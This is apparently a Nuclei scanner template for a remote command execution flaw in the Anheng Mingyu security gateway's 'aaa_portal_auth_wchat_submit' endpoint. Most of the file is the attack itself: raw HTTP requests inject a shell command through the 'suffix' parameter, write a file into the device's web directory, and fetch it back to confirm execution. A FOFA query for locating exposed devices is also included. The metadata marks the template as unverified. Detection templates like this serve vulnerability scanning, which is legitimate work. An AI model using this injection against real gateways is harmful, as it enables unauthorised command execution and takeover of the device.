id: anheng-das-gateway-aaa_portal_auth_wchat_submit-rce
info:
  name: 安恒明御安全网关 aaa_portal_auth_wchat_submit - rce
  author: leadlife
  severity: critical
  description: 安恒信息明御安全网关（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_local_web_preview%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: false
    fofa-query: title="明御安全网关"
    tips: 未复现
  tags: anheng,das,mingyu,iot,rce

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'
  
http:
  - raw:
      - |
        GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60echo%20{{randstr}}%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt|ls HTTP/1.1
        Host: {{Hostname}} 

      - |
        GET /sslvpn/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}} 
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and